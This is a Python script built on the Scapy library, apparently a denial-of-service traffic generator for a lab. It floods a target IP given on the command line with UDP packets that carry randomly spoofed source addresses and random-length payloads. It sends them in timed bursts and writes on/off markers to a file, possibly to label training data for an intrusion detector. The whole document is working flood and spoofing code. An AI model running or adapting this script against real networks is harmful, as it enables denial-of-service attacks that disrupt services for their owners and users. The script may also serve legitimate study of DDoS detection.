import sys
import time
from os import popen
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import sendp, IP, UDP, Ether, TCP, Raw
from random import randrange
from time import sleep

def generateSourceIP():
    not_valid = [10, 127, 254, 255, 1, 2, 169, 172, 192]

    first = randrange(1, 256)

    while first in not_valid:
        first = randrange(1, 256)
        #print first

    ip = ".".join([str(first), str(randrange(1,256)), str(randrange(1,256)), str(randrange(1,256))])
    #print ip
    return ip


def main():
    for i in range (1, 5):
        launchAttack()
        time.sleep (10)

def launchAttack():
  #eg, python attack.py 10.0.0.64, where destinationIP = 10.0.0.64
  destinationIP = sys.argv[1:]
  #print destinationIP

  interface = popen('ifconfig | awk \'/eth0/ {print $1}\'').read()

  count = 0
  for j in range(0, 600):
    if (j == 0):
        sleep(3)
    
    with open('hihi.txt', 'w') as f:
                f.write("0")
    sleep(3)
    start = time.time()
    for i in range(0, 50): #50-50(80) #75-25(50)
        packets = Ether() / IP(dst = destinationIP, src = generateSourceIP()) / UDP(dport = 1, sport = 80)/ Raw(b'A' * (randrange(64,128)))

        print(repr(packets))
        #send packets with interval = 0.025 s
        sendp(packets, iface = interface.rstrip(), inter = 0.03) #25%:0.3     50%:0.1      75%: 1/30
    count += 1 
    print("so lan chay attack: ", count)
    end = time.time()
    if ((end - start) < 3):
        sleep(3-(end-start))
    with open('hihi.txt', 'w') as f:
                f.write("1")
    sleep(3)

if __name__=="__main__":
  main()
                                                                                                                                                                                                                                                                                                       
